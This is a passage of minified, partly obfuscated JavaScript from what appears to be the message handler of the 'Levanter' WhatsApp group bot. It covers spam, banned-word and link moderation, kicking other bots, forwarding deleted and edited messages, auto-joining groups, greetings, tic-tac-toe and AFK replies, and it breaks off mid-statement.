      const aC = as - at;
      const aD = (ar.env.WARN_MESSAGE || c9.lang.plugins.warn.warn_default)
        .replace("&mention", aB)
        .replace("{mention}", aB)
        .replace("&remaining", aC)
        .replace("{remaining}", aC)
        .replace("&warn", as)
        .replace("{warn}", as)
        .replace("{0}", aB)
        .replace("{1}", aC)
        .replace("{2}", as);
      const aE = {
        text: aD,
      };
      const aF = {
        mentionedJid: [ai],
      };
      const aG = {
        contextInfo: aF,
      };
      const aH = {
        type: "prepare_message",
        chat: aj,
        message: aE,
        options: aG,
      };
      al.queue.push(aH);
    }
  } catch (aJ) {
    c9.logger.error(aJ, "executeWarnAction failed");
  }
}
function i3(a7, a8) {
  return a5(a7 + 0x27a, a8);
}
async function di(a7, a8, a9, aa, ab, ac, ad) {
  if ("fulfilled" !== a7.status || !a7.value) {
    return;
  }
  const ag = a7.value;
  if (ag && a8.botIsAdmin) {
    try {
      await c9.setTMessage(a9.id, null, true);
      ab.deleteQueue.push({
        type: "bulk_delete",
        chat: a9.remoteJid,
        key: a9,
        delay: 0x12c,
        options: {},
      });
      if ("kick" === ag) {
        await ab.queue.push({
          type: "participant_remove",
          chat: a9.remoteJid,
          participant: a8.participant,
        });
      } else if ("warn" === ag) {
        await dh(a8.participant, a9.remoteJid, a8.session, ab, ac, ad);
      }
    } catch (ai) {
      c9.logger.error(ai, "handleAntiWordViolation failed");
    }
  }
}
async function dj(a8, a9, aa, ab, ac, ad) {
  if ("fulfilled" !== a8.status || !a8.value) {
    return;
  }
  const ag = a8.value;
  if (!ag.isSpam || !a9.botIsAdmin) {
    return void console.log("[TEST] handleAntiSpamViolation skipped:", {
      isSpam: ag.isSpam,
      botIsAdmin: a9.botIsAdmin,
    });
  }
  const { action: ah } = ag;
  if (!cg[a9.session].temp.spamLocks) {
    cg[a9.session].temp.spamLocks = {};
  }
  if (!cg[a9.session].temp.spamLocks[aa.remoteJid]) {
    cg[a9.session].temp.spamLocks[aa.remoteJid] = {};
  }
  if (!cg[a9.session].temp.spamLocks[aa.remoteJid][a9.participant]) {
    cg[a9.session].temp.spamLocks[aa.remoteJid][a9.participant] = true;
    try {
      const aj = (
        cg[a9.session].temp.spam?.[aa.remoteJid]?.[a9.participant]?.["keys"] ||
        []
      ).filter((ak) => ak.participant === a9.participant);
      for (const ak of aj) {
        await c9.setTMessage(ak.id, null, true);
        ab.deleteQueue.push({
          type: "bulk_delete",
          chat: aa.remoteJid,
          key: ak,
          delay: 500 + ci(1000 * Math.random()),
          options: {},
        });
      }
      if ("kick" === ah) {
        if (!(a9.participant in cb)) {
          cb[a9.participant] = 1;
          try {
            const am = {
              type: "participant_remove",
              chat: aa.remoteJid,
              participant: a9.participant,
            };
            ab.queue.push(am);
            if ("false" !== cg[a9.session].env.ANTISPAM_MSG) {
              ab.queue.push({
                type: "prepare_message",
                chat: aa.remoteJid,
                message: {
                  text: cg[a9.session].env.ANTISPAM_MSG.replace(
                    "&mention",
                    "@" + c9.jidToNum(a9.participant),
                  ),
                },
                options: {
                  contextInfo: {
                    mentionedJid: [a9.participant],
                  },
                },
              });
            }
          } catch (an) {
            c9.logger.error(
              an,
              "[ANTISPAM] Failed to kick " +
                a9.participant +
                " from " +
                aa.remoteJid,
            );
          } finally {
            delete cb[a9.participant];
          }
        }
      } else if ("warn" === ah) {
        await dh(a9.participant, aa.remoteJid, a9.session, ab, ac, ad);
      }
    } catch (ao) {
      console.error(
        "[TEST] handleAntiSpamViolation ERROR:",
        ao.message,
        ao.stack,
      );
      c9.logger.error(ao, "handleAntiSpamViolation failed");
    } finally {
      delete cg[a9.session].temp.spamLocks[aa.remoteJid][a9.participant];
    }
  }
}
async function dk(a7, a8, a9, aa, ab, ac) {
  if ("fulfilled" !== a7.status || !a7.value) {
    return;
  }
  const af = a7.value;
  if (af && a8.botIsAdmin) {
    try {
      await c9.setTMessage(a9.id, null, true);
      aa.deleteQueue.push({
        type: "bulk_delete",
        chat: a9.remoteJid,
        key: a9,
        delay: 0x12c,
        options: {},
      });
      if ("kick" === af) {
        await aa.queue.push({
          type: "participant_remove",
          chat: a9.remoteJid,
          participant: a8.participant,
        });
      } else if ("warn" === af) {
        await dh(a8.participant, a9.remoteJid, a8.session, aa, ab, ac);
      }
    } catch (ag) {
      c9.logger.error(ag, "handleAntiLinkViolation failed");
    }
  }
}
let dl = false;
function i2(a7, a8) {
  return a5(a8 - 0x11, a7);
}
async function dm(a7, a8, a9, aa, ab, ac, ad, af) {
  if (process.env.LEVANTER_TEST) {
    dl = true;
  }
  if (process.env.LEVANTER_TEST) {
    console.log("[TEST] processSecurityChecks START:", {
      hasUrls: ad,
      is_not_white: af,
      spamFlag: dl,
    });
    console.log("[TEST] Anti-Spam Condition Check:", {
      is_not_white: af,
      spamFlag: dl,
      isGroup: a7.isGroup,
      notBot: !a7.isBot,
      notFromMe: !a7.fromMe,
      notVotes: !a7.votes,
      notAdmin: !a7.admin,
    });
  }
  try {
    const [ai, aj, ak] = await Promise.allSettled([
      a7.text && af && a7.isGroup && !a7.fromMe && !a7.votes && !a7.admin
        ? d1.isWords(a7.text, a8.remoteJid, a7.session)
        : Promise.resolve(false),
      !(af && dl && a7.isGroup) || a7.isBot || a7.fromMe || a7.votes || a7.admin
        ? Promise.resolve(false)
        : d2.isSpam(
            a8.remoteJid,
            a7.participant,
            a8,
            a9.type,
            a7.text || "",
            a7.mentions || [],
            ad,
            a7.session,
          ),
      a7.text && af && a7.isGroup && !a7.fromMe && !a7.votes && !a7.admin
        ? d1.isAntiLink(a7.text, a8.remoteJid, a7.session)
        : Promise.resolve(false),
    ]);
    const al = async () =>
      a7.isGroup
        ? ac || (await cg[a7.session].fetchGroupMetadata(a8.remoteJid))
        : null;
    await Promise.all([
      di(ai, a7, a8, a9, aa, ab, await al()),
      dj(aj, a7, a8, aa, ab, await al()),
      dk(ak, a7, a8, aa, ab, await al()),
    ]);
  } catch (am) {
    c9.logger.error(am, "processSecurityChecks failed");
  }
}
if (d7) {
  exports.handler = async (aU, aV, aW) => {
    if (!bY) {
      const b8 = await bX();
      bY = b8.jidNormalizedUser;
      bZ = b8.getContentType;
      c0 = b8.normalizeMessageContent;
      c1 = b8.isJidGroup;
      c2 = b8.delay;
      c3 = b8.downloadMediaMessage;
      c4 = b8.getAggregateVotesInPollMessage;
      c5 = b8.getKeyAuthor;
      c6 = b8.decryptPollVote;
    }
    const aY = aV.session;
    const aZ = aV.botState;
    const b0 = "true" === process.env.DEBUG_RESTART;
    if (b0) {
      c9.logger.info(
        "[Handler] Entry: msg=" +
          aU.key?.["id"]?.["slice"](-8) +
          ", connected=" +
          aZ?.["connected"] +
          ", sessionValid=" +
          !!aY,
      );
    }
    if (aZ.id !== aY.levanterId) {
      return void (
        b0 &&
        c9.logger.warn(
          "[Handler] Session ID mismatch: " + aZ.id + " !== " + aY.levanterId,
        )
      );
    }
    const b1 = aZ.bot;
    let b2 = false;
    let b3 = false;
    if (!dl) {
      dl = process.uptime() > 60;
    }
    const { key: b4, message: b5, pushName: b6, messageTimestamp: b7 } = aU;
    if (!b5 || (b4 && "status@broadcast" == b4.remoteJid) || !aZ) {
      if (b0 && !b5) {
        c9.logger.warn(
          "[Handler] No message content for " + b4?.["id"]?.["slice"](-8),
        );
      }
    } else {
      try {
        let ba = {
          session: aZ.id,
        };
        if (
          cg[ba.session].DISABLE_BOT_JIDS.includes(
            b4.participantAlt || b4.participant,
          ) ||
          aZ.bbb.includes(b4.participantAlt || b4.participant) ||
          aZ.bbb.includes(b4.remoteJidAlt || b4.remoteJid)
        ) {
          return;
        }
        ba.message = b4.id.startsWith("EVENT_") ? b5 : c0(b5);
        ba.type = bZ(ba.message) || Object.keys(ba.message)[0];
        if (!ba.type) {
          return;
        }
        if ("eventMessage" === ba.type) {
          ba.type = "event";
          ba.event_action = ba.message.eventMessage.action;
        }
        ba.isGroup = c1(b4.remoteJid);
        let bb = null;
        const bc = ba.isGroup
          ? cg[ba.session].groupMetadata[b4.remoteJid]
          : null;
        if (bc && bc.participants) {
          bb = bc;
        }
        const bd = async () =>
          ba.isGroup
            ? bb ||
              ((bb = await cg[ba.session].fetchGroupMetadata(b4.remoteJid)), bb)
            : null;
        const bf = cx(aY.user.lid);
        const bg = aY.user.jid;
        const bh =
          true === b4.fromMe ||
          b4.participant === bf ||
          (!ba.isGroup &&
            (b4.remoteJid === bg ||
              b4.remoteJid === bf ||
              b4.remoteJidAlt === bg ||
              b4.remoteJidAlt === bf));
        let bi;
        if (ba.isGroup) {
          if (b4.participantAlt || b4.participant) {
            const dp =
              bY(b4.participantAlt || b4.participant) ||
              b4.participantAlt ||
              b4.participant;
            bi =
              (dp &&
                dp.endsWith("lid") &&
                (await cg[ba.session].findJid(dp))) ||
              dp;
          } else {
            bi = bh ? aY.user.jid : aU.participantAlt || aU.participant;
          }
          if (!bi) {
            c9.logger.warn(
              "[Handler] Failed to resolve participant for group message " +
                b4.id +
                " in " +
                b4.remoteJid +
                ". Type: " +
                ba.type +
                "  Message: " +
                JSON.stringify(aU) +
                " ",
            );
          }
        } else {
          if (bh) {
            bi = aY.user.jid;
          } else {
            const dq = b4.remoteJid?.["endsWith"]("@s.whatsapp.net")
              ? b4.remoteJid
              : null;
            const dr = b4.remoteJidAlt?.["endsWith"]("@s.whatsapp.net")
              ? b4.remoteJidAlt
              : null;
            bi = dq || dr || b4.remoteJidAlt || b4.remoteJid;
          }
        }
        if (b0) {
          c9.logger.info(
            "[Handler] Step 2: _p resolved = " + bi?.["slice"](0, 20) + "...",
          );
        }
        if (ba.isGroup) {
          if (bi && bi.endsWith("@s.whatsapp.net")) {
            ba.participant = bi;
          } else {
            const dt = bb || (await bd());
            const du = dt?.["participants"]["find"](
              (dv) => dv.id === bi || dv.phoneNumber === bi || dv.lid === bi,
            );
            ba.participant = du?.["phoneNumber"] || du?.["id"] || bi;
          }
        } else {
          ba.participant = bi;
        }
        ba.key = b4;
        ba.mentions = [];
        ba.pushName = (b6 && b6.replace(/\n/g, "")) || "";
        ba.fromMe =
          ba.participant &&
          (ba.participant == aY.user.jid || ba.participant == bf);
        if (b0) {
          c9.logger.info(
            "[Handler] Step 3: participant=" +
              ba.participant?.["slice"](0, 20) +
              ", fromMe=" +
              ba.fromMe +
              ", type=" +
              ba.type,
          );
        }
        if ("reactionMessage" === ba.type) {
          if (
            ba.isGroup &&
            ba.message.reactionMessage.key.fromMe &&
            ba.message.reactionMessage.text
          ) {
            const dx = await c9.participateInVote(
              b4.remoteJid,
              ba.message.reactionMessage.text,
              ba.participant,
              "not_reply_message",
              ba.session,
            );
            if (dx) {
              const dy =
                "@" +
                c9.jidToNum(ba.participant) +
                " voted for " +
                ba.message.reactionMessage.text +
                "\n\n" +
                dx;
              const dz = {
                contextInfo: {
                  mentionedJid: [ba.participant],
                },
              };
              const dA = {
                text: dy,
              };
              const dB = {
                type: "prepare_message",
                chat: b4.remoteJid,
                message: dA,
                options: dz,
              };
              return void aV.queue.push(dB);
            }
          }
          const dv = {
            user: aY.user,
          };
          ba.text = ba.message.reactionMessage.text || "";
          d5();
          return void c9.levanter.emit(
            "reaction.message",
            new ca(dv, ba, false, aY),
          );
        }
        if ("pollUpdateMessage" === ba.type) {
          const dD = await aW(
            ba.message.pollUpdateMessage.pollCreationMessageKey,
          );
          if (!dD) {
            return;
          }
          const dE = dD.messageContextInfo?.["messageSecret"];
          const dF = c5(
            ba.message.pollUpdateMessage.pollCreationMessageKey,
            aY.user.jid,
          );
          const dG = c5(b4, aY.user.jid);
          const dH = c6(ba.message.pollUpdateMessage.vote, {
            pollEncKey: dE,
            pollCreatorJid: dF,
            pollMsgId: ba.message.pollUpdateMessage.pollCreationMessageKey.id,
            voterJid: dG,
          });
          const dI = c4({
            message: dD,
            pollUpdates: [
              {
                vote: dH,
                pollUpdateMessageKey: b4,
              },
            ],
          });
          ba.votes = dI;
        }
        let bj = !cg[ba.session].WHITE_LIST_MAP.includes(ba.participant);
        let bk =
          bh ||
          (ba.participant &&
            cg[ba.session].TEMP_SUDO.includes(c9.jidToNum(ba.participant))) ||
          (ba.participant &&
            ba.participant.endsWith("lid") &&
            (await bd()) &&
            cZ(ba.participant, await bd(), cg[ba.session].TEMP_SUDO));
        if (b0) {
          c9.logger.info(
            "[Handler] Step 4: isSudo=" + bk + ", is_not_white=" + bj,
          );
        }
        if (bj && "groupStatusMentionMessage" === ba.type && !ba.fromMe) {
          const dJ = await c9.getGroupMention();
          if (!dJ.enabled) {
            return;
          }
          if (c9.parsedJid(dJ.filter).includes(b4.remoteJid)) {
            return;
          }
          if (!bb) {
            return;
          }
          if (!(await c9.isAdmin(bb.participants, aY.user.jid))) {
            return;
          }
          if (await c9.isAdmin(bb.participants, ba.participant)) {
            return;
          }
          const dK = {
            type: "prepare_message",
            chat: b4.remoteJid,
            message: {},
          };
          dK.message["delete"] = b4;
          aV.queue.push(dK);
          await c2(500);
          if ("kick" === dJ.action) {
            return aV.queue.push({
              type: "participant_remove",
              chat: b4.remoteJid,
              participant: ba.participant,
            });
          }
          if ("warn" === dJ.action) {
            bk = true;
            ba.text = cg[ba.session].PREFIX + dJ.action + ba.participant;
            ba.mentions = [ba.participant];
          }
        }
        if (bj && "groupStatusMessageV2" === ba.type && !ba.fromMe) {
          const dM = await c9.getAntiGstatus();
          if (!dM.enabled) {
            return;
          }
          if (dM.jids.includes(b4.remoteJid)) {
            return;
          }
          const dN = bb || (await bd());
          if (!dN) {
            return;
          }
          if (!(await c9.isAdmin(dN.participants, aY.user.jid))) {
            return;
          }
          if (await c9.isAdmin(dN.participants, ba.participant)) {
            return;
          }
          const dO = {
            type: "prepare_message",
            chat: b4.remoteJid,
            message: {},
          };
          dO.message["delete"] = b4;
          return void aV.queue.push(dO);
        }
        ba.edited = false;
        if (b0) {
          c9.logger.info("[Handler] Step 5: creating ctx...");
        }
        const bl = {
          ...cg[ba.session].env,
          commands: cg[ba.session].commands,
          PREFIX: cg[ba.session].PREFIX,
          ...cg[ba.session].AFK,
          pluginsCount: cg[ba.session].pluginsCount.count,
        };
        if ("protocolMessage" == ba.type) {
          const dP = ba.message[ba.type];
          if (0 !== dP.type && 14 !== dP.type) {
            return;
          }
          if (0 === dP.type) {
            const dQ = ba.message[ba.type];
            d4.chats.del("" + dQ.key.remoteJid + dQ.key.id);
            const {
              enabled: dR,
              destination: dS,
              scope: dT,
            } = cP(cg[ba.session].env.ANTI_DELETE);
            if (!cw.includes(b4.remoteJid) && dR && cQ(dT, b4.remoteJid)) {
              const dU = dQ.key && (await c9.getTMessage(dQ.key.id));
              if (!dU || true === dU.key.fromMe) {
                return;
              }
              await c9.setTMessage(dQ.key.id, null, true);
              const dV =
                "g" === dS ? b4.remoteJid : "p" === dS || "on" === dS ? b1 : dS;
              const dW = {
                head: c9.lang.extra.deleted_message,
                body: "",
              };
              const dX = {
                type: "forward",
                chat: dV,
                message: dU,
                options: {},
              };
              dX.options.quoted = dU;
              dX.options.linkPreview = dW;
              await aV.queue.push(dX);
            }
            return void (b2 = true);
          }
          if (14 === dP.type) {
            const dY = dP.editedMessage;
            const dZ = bZ(dY);
            const e0 = cO(dY, dZ) || "";
            const e1 = await c9.getTMessage(dP.key.id);
            if (!e1) {
              return;
            }
            const e2 =
              e1.message?.["messageContextInfo"]?.["messageSecret"] ||
              ba.message?.["messageContextInfo"]?.["messageSecret"];
            const e3 = {
              key: e1.key,
              message: e2
                ? {
                    ...dY,
                    messageContextInfo: {
                      ...(dY.messageContextInfo || {}),
                      messageSecret: e2,
                    },
                  }
                : dY,
            };
            const e4 = await c9.updateTMessage(dP.key.id, e3);
            const {
              enabled: e5,
              destination: e6,
              scope: e7,
            } = cP(cg[ba.session].env.ANTI_EDIT);
            if (e4 && e5 && cQ(e7, b4.remoteJid)) {
              const e8 = e4.history[e4.history.length - 1];
              const e9 = (e8 && e8.message) || e8;
              if ((cO(e9, bZ(e9)) || "") !== e0) {
                const ea =
                  "g" === e6
                    ? b4.remoteJid
                    : "p" === e6 || "on" === e6
                      ? b1
                      : e6;
                let eb = "";
                for (let ef = e4.history.length - 1; ef >= 0; ef--) {
                  const eg = e4.history[ef];
                  const eh = eg.message || eg;
                  eb +=
                    "*#" + (ef + 1) + "*\n" + (cO(eh, bZ(eh)) || "") + "\n\n";
                }
                eb = eb.trim();
                const ec = e4.history[0];
                const ed = {
                  text: eb,
                };
                await aV.queue.push({
                  type: "prepare_message",
                  chat: ea,
                  message: ed,
                  options: {
                    quoted: ec,
                    linkPreview: {
                      head: (
                        c9.lang.extra.edited_message ||
                        "           Message edited #{0}"
                      ).replace("{0}", e4.editCount),
                      body: "",
                    },
                  },
                });
              }
            }
            ba.message = dP.editedMessage;
            ba.type = bZ(ba.message);
            ba.edited = true;
          }
        }
        let bm = cO(ba.message, ba.type);
        if ("true" == cg[ba.session].env.AJOIN) {
          if ("groupInviteMessage" == ba.type) {
            await c2(1000);
            const ek = {
              id: ba.key.remoteJid,
              key: ba.key,
              message: ba.message[ba.type],
            };
            const em = Math.floor(9000 * Math.random() + 1000);
            const en = {
              key: b4,
              message: b5,
            };
            const eo = {
              quoted: en,
            };
            cG[em] = ek;
            return await aV.queue.push({
              type: "prepare_message",
              chat: b1,
              message: {
                text: "Send " + em + ", to join",
              },
              options: eo,
            });
          }
          if (cG[bm] && cG[bm].id == ba.key.remoteJid) {
            await c2(1000);
            try {
              const ep = {
                key: b4,
                message: b5,
              };
              const eq = {
                quoted: ep,
              };
              await aY.groupAcceptInviteV4(cG[bm].key, cG[bm].message);
              await c2(1000);
              await aV.queue.push({
                type: "prepare_message",
                chat: b1,
                message: {
                  text: "_Joined_",
                },
                options: eq,
              });
            } catch (er) {
              c9.logger.error(er, "Failed to join group via auto-join");
            } finally {
              delete cG[bm];
            }
            return;
          }
        }
        ba.admin = false;
        ba.botIsAdmin = false;
        if (ba.isGroup) {
          const eu = bb || (await bd());
          if (eu) {
            try {
              ba.admin = await c9.isAdmin(eu.participants, ba.participant);
              ba.botIsAdmin = await c9.isAdmin(eu.participants, aY.user.jid);
            } catch (ev) {}
          }
        }
        ba.SUDO = bk;
        ba.isForwarded = ba.message[ba.type]?.["contextInfo"]?.["isForwarded"];
        const bn = ba.message[ba.type]?.["contextInfo"]?.["expiration"];
        if (
          !ba.isGroup &&
          !ba.fromMe &&
          "null" != cg[ba.session].env.PERSONAL_MESSAGE &&
          (cY[ba.session] || (cY[ba.session] = new Set()),
          !cY[ba.session].has(ba.participant))
        ) {
          if (!(await cc(ba.participant, ba.session))) {
            if (!cn.done) {
              const eA = cj(cg[ba.session].env.PERSONAL_MESSAGE);
              if (eA && eA.startsWith("http")) {
                const eC = await c9.getBuffer(eA, false);
                if (
                  eC.buffer &&
                  ["image", "video", "audio"].includes(eC.type)
                ) {
                  cn.path = da.join(
                    __dirname,
                    "../media/greet." +
                      eC.mimetype.split("/")[1].split(".").pop(),
                  );
                  bU.writeFileSync(cn.path, eC.buffer);
                  cn.type = eC.mimetype.endsWith("webp") ? "sticker" : eC.type;
                  cn.message = cg[ba.session].env.PERSONAL_MESSAGE.replace(
                    eA,
                    "",
                  ).trim();
                }
              }
              cn.done = true;
              if (!cn.message) {
                cn.message = cg[ba.session].env.PERSONAL_MESSAGE;
              }
            }
            const ey = cn.type ? cn.type : "text";
            const ez = await c9.uptimeQuoteReplace(cn.message);
            try {
              await aV.queue.push({
                type: "prepare_message",
                chat: ba.participant,
                message: {
                  [ey]: "text" == ey ? ez : bU.readFileSync(cn.path),
                },
                options: {
                  caption: ez,
                },
              });
              await cd(ba.participant, ba.session);
            } catch (eF) {
              c9.logger.error(eF);
            }
          }
          cY[ba.session].add(ba.participant);
        }
        const bo =
          b4.id && "string" == typeof b4.id
            ? b4.id.length > 30
              ? "android"
              : 20 != b4.id.length || b4.id.startsWith("RGNK")
                ? "3EB" === b4.id.substring(0, 3)
                  ? "web"
                  : 18 == b4.id.length
                    ? "win"
                    : "bot"
                : "ios"
            : b4.id;
        const bp = "web" === bo;
        const bq = ba.message[ba.type]?.["contextInfo"]?.["mentionedJid"] || [];
        ba.mentions = [];
        if (b0 && bq.length > 0) {
          c9.logger.info(
            "[Handler] Resolving " +
              bq.length +
              " mentions for msg " +
              b4.id?.["slice"](-8),
          );
        }
        for (const eG of bq) {
          let eH = bY(eG) || eG;
          if (eH.endsWith("lid")) {
            if (b0) {
              c9.logger.info(
                "[Handler] Resolving LID mention: " +
                  eH?.["slice"](0, 15) +
                  "...",
              );
            }
            eH = (await cg[ba.session].findJid(eH)) || eH;
            if (b0) {
              c9.logger.info(
                "[Handler] Resolved to: " + eH?.["slice"](0, 15) + "...",
              );
            }
          }
          ba.mentions.push(bY(eH));
        }
        ba.isBot =
          "string" == typeof b4.id &&
          ((b4.id.startsWith("3EB0") && 12 === b4.id.length) ||
            (b4.id.startsWith("BAE5") && 16 === b4.id.length));
        if (!ba.isBot) {
          ba.isBot = "bot" == bo;
        }
        if (!(ba.isBot || null == bn)) {
          ck.set(b4.remoteJid, bn);
        }
        if (
          bj &&
          (ba.isBot || (bp && "true" === cg[ba.session].env.IGNORE_WEB)) &&
          !ba.fromMe &&
          "false" !== cg[ba.session].env.ANTI_BOT &&
          ba.isGroup &&
          !ba.admin
        ) {
          if (ba.SUDO) {
            return;
          }
          const eJ = bb || (await bd());
          if (!eJ) {
            return;
          }
          const eK = eJ.participants;
          if (!eK) {
            return;
          }
          if (!(await c9.isAdmin(eK, aY.user.jid))) {
            return;
          }
          if (await c9.isAdmin(eK, ba.participant)) {
            return;
          }
          if (!("true" === cg[ba.session].env.ANTI_BOT)) {
            if (
              !c9
                .parsedJid(cg[ba.session].env.ANTI_BOT)
                .includes(ba.key.remoteJid)
            ) {
              return;
            }
          }
          const eL = {
            type: "participant_remove",
            chat: b4.remoteJid,
            participant: ba.participant,
          };
          await aV.queue.push(eL);
          await c2(1000);
          return void (
            "false" !== cg[ba.session].env.ANTI_BOT_MESSAGE &&
            (await aV.queue.push({
              type: "prepare_message",
              chat: b4.remoteJid,
              message: {
                text: cg[ba.session].env.ANTI_BOT_MESSAGE.replace(
                  "&mention",
                  "@" + c9.jidToNum(ba.participant),
                ),
              },
              options: {
                contextInfo: {
                  mentionedJid: [ba.participant],
                },
              },
            }))
          );
        }
        if ("stickerMessage" == ba.type) {
          const eN =
            ba.message[ba.type]?.["fileSha256"]?.["toString"]("base64");
          if (
            (ba.SUDO || ba.fromMe) &&
            eN &&
            cg[ba.session].db?.["cmd"] &&
            cg[ba.session].db.cmd[eN]
          ) {
            bm = cg[ba.session].PREFIX + cg[ba.session].db.cmd[eN];
          }
        }
        if (!(
          !cS(cg[ba.session].env.SEND_READ, b4.remoteJid) ||
          ba.isBot ||
          bh ||
          ba.votes
        )) {
          if ("audioMessage" === ba.type && ba.message[ba.type].ptt) {
            await aY.sendReceipt(
              b4.remoteJid,
              b4.participant,
              [b4.id],
              "played",
            );
          } else {
            await aV.queue.push({
              type: "read",
              chat: b4.remoteJid,
              participant: b4.participant,
              ids: [b4.id],
            });
          }
        }
        ba.text = bm || "";
        if (!ba.isBot && ba.text) {
          if (
            await c9.wcg.isWord(
              b4.remoteJid,
              ba.participant,
              ba.text,
              {
                key: b4,
                message: b5,
              },
              ba.session,
            )
          ) {
            return;
          }
          if (ba.text.toLowerCase().endsWith("join")) {
            if (await c9.wcg.join(b4.remoteJid, ba.participant, ba.session)) {
              return;
            }
          }
        }
        ba.messageTimestamp = b7;
        ba.quoted = null;
        const br = ba.message[ba.type]?.["contextInfo"];
        const bs = br?.["quotedMessage"];
        if (bs) {
          let eR = {};
          eR.message = c0(bs);
          const eS = br.participant || br.participantAlt;
          const eT = eS.endsWith("@lid")
            ? await cg[ba.session].findJid(eS)
            : eS;
          eR.key = {
            remoteJid: br.remoteJid || b4.remoteJid,
            fromMe: br.participant == aY.user.jid,
            id: br.stanzaId,
            participant: eS,
            participantAlt: bY(eT),
          };
          eR.type = bZ(bs) || Object.keys(bs)[0];
          if (
            [
              "ptvMessage",
              "viewOnceMessageV2Extension",
              "ephemeralMessage",
              "viewOnceMessage",
              "viewOnceMessageV2",
            ].includes(eR.type)
          ) {
            eR.message = c0(bs[eR.type].message);
            eR.type = bZ(eR.message);
          }
          eR.isGroup = c1(eR.key.remoteJid);
          bY(eR.key.participantAlt);
          eR.participant = eR.isGroup
            ? await cg[ba.session].findJid(eR.key.participant)
            : await cg[ba.session].findJid(eR.key.remoteJid);
          eR.fromMe = eR.key.fromMe;
          eR.isBot =
            ("string" == typeof eR.key.id &&
              eR.key.id.startsWith("3EB0") &&
              12 == eR.key.id.length) ||
            ("string" == typeof eR.key.id &&
              eR.key.id.startsWith("BAE5") &&
              16 === eR.key.id.length);
          const eU = eR.message[eR.type];
          eR.text = "string" == typeof eU ? eU : null;
          if (!eR.text) {
            eR.text =
              eU?.["text"] ||
              eU?.["caption"] ||
              eU?.["conversation"] ||
              eU?.["contentText"] ||
              eU?.["selectedDisplayText"] ||
              eU?.["title"] ||
              "";
          }
          ba.quoted = eR;
          eR = null;
        }
        if (
          c7.API_ENABLED &&
          "event" !== ba.type &&
          !String(ba.key.remoteJid).includes("status@broadcast")
        ) {
          c9.levanter.emit("incoming.message", ba);
        }
        if (!c7.BOT_ENABLED) {
          return;
        }
        const bt =
          "conversation" == ba.type || "extendedTextMessage" == ba.type
            ? "text"
            : ba.type.split(ba.type.match(/[A-Z]/) || [])[0];
        if (bt && ba.isGroup && !ba.isBot && "0" === ba.session) {
          if (!ba.key.remoteJid || !ba.participant) {
            return void c9.logger.warn({
              message: aU,
              error:
                "missing gid/uid for " + ba.type + ". Msg ID: " + ba.key.id,
            });
          }
          await cf(ba.key.remoteJid, ba.participant, bt, ba.pushName);
        }
        if ("true" === cg[ba.session].env.LOG_MSG) {
          c9.logger.debug({
            id: ba.key.id,
            remoteJid: b4.remoteJid,
            text: ba.text ? ba.text : ba.type,
            participant: ba.isGroup ? c9.jidToNum(ba.participant) : "",
          });
        }
        if ("text" == bt && !ba.isBot && !ba.votes) {
          const eW = Number(ba.text);
          if (eW >= 1 && eW < 10) {
            const { code: eX, text: eY } = await d9.isTicTacToe(
              ba.text,
              ba.key.remoteJid,
              ba.participant,
              ba.session,
            );
            const eZ = {
              text: eY,
            };
            const f0 = {
              quoted: aU,
            };
            if (process.env.LEVANTER_TEST && eX) {
              console.log("[TEST] TicTacToe move detected, code:", eX);
            }
            if (300 == eX) {
              return await aV.queue.push({
                type: "prepare_message",
                chat: ba.key.remoteJid,
                message: eZ,
                options: f0,
              });
            }
            const f1 = {
              text: eY[2],
            };
            const f2 = {
              mentionedJid: [eY[0], eY[1]],
            };
            const f3 = {
              contextInfo: f2,
            };
            if (301 == eX) {
              return await aV.queue.push({
                type: "prepare_message",
                chat: ba.key.remoteJid,
                message: f1,
                options: f3,
              });
            }
            if (201 == eX) {
              const f4 =
                "---" +
                c9.lang.plugins.tictactoe.game_finish +
                "---\n\n" +
                c9.lang.plugins.tictactoe.winner +
                " : @" +
                c9.jidToNum(eY[0]) +
                "\n\n" +
                eY[2];
              const f5 = {
                text: f4,
              };
              const f6 = {
                mentionedJid: [eY[0], eY[1]],
              };
              const f7 = {
                contextInfo: f6,
              };
              const f8 = {
                type: "prepare_message",
                chat: ba.key.remoteJid,
                message: f5,
                options: f7,
              };
              return await aV.queue.push(f8);
            }
            if (403 == eX) {
              const f9 = "---Game Tie ⏹---\n\n" + eY[2];
              const fa = {
                text: f9,
              };
              const fb = {
                mentionedJid: [eY[0], eY[1]],
              };
              const fc = {
                contextInfo: fb,
              };
              const fd = {
                type: "prepare_message",
                chat: ba.key.remoteJid,
                message: fa,
                options: fc,
              };
              return await aV.queue.push(fd);
            }
          }
        }
        if (
          cg[ba.session].AFK &&
          cg[ba.session].AFK.isAfk &&
          !ba.isBot &&
          ba.text
        ) {
          const fg =
            !ba.isGroup ||
            ba.mentions.includes(cg[ba.session].AFK.p) ||
            (ba.quoted && ba.quoted.participant == cg[ba.session].AFK.p);
          const fh = {
            text: c9.lang.plugins.afk.not_afk,
          };
          const fi = {
            key: b4,
            message: b5,
          };
          const fj = {
            quoted: fi,
          };
          if (ba.fromMe || ba.participant === cg[ba.session].AFK.p) {
            cg[ba.session].AFK.isAfk = false;
            return await aV.queue.push({
              type: "prepare_message",
              chat: cg[ba.session].AFK.p,
              message: fh,
              options: fj,
            });
          }
          if (fg) {
            return await aV.queue.push({
              type: "prepare_message",
              chat: b4.remoteJid,
              message: {
                text: cg[ba.session].AFK.reason.replace(
                  "#lastseen",
                  ch(
                    Math.round(new Date().getTime() / 1000) -
                      cg[ba.session].AFK.lastseen,
                  ),
                ),
              },
              options: {
                quoted: {
                  key: b4,
                  message: b5,
                },
              },
            });
          }
        }
        const bv = aY.logout;
        let bw =
          ba.participant && ba.participant.endsWith("lid")
            ? cg[ba.session].TEMP_SUDO[0] + "@lid"
            : c9.numToJid(cg[ba.session].TEMP_SUDO[0]);
        const bx = [aY.user.jid];
        if (aY.user.lid) {
          bx.push(aY.user.lid);
          bx.push(cx(aY.user.lid));
        }
        if (bw) {
          bx.push(bw);
        }
        const by =
          "event" !== ba.type &&
          ba.mentions.some((fk) => bx.includes(fk) || bx.includes(bY(fk)));
        if (!ba.edited && !ba.isBot && by) {
          const fk = await c9.getMention(ba.session);
          if (fk && fk.enabled && !cw.includes(b4.remoteJid)) {
            const fl = {};
            const fm = {
              key: b4,
              message: b5,
            };
            fl.quoted = fm;
            fl.contextInfo = {};
            const fn = cg[ba.session].parsedMention;
            if (fn) {
              const fs = structuredClone(fn);
              await cA(fs);
              Object.assign(fl, fs);
            }
            const fo = fk.text.match(
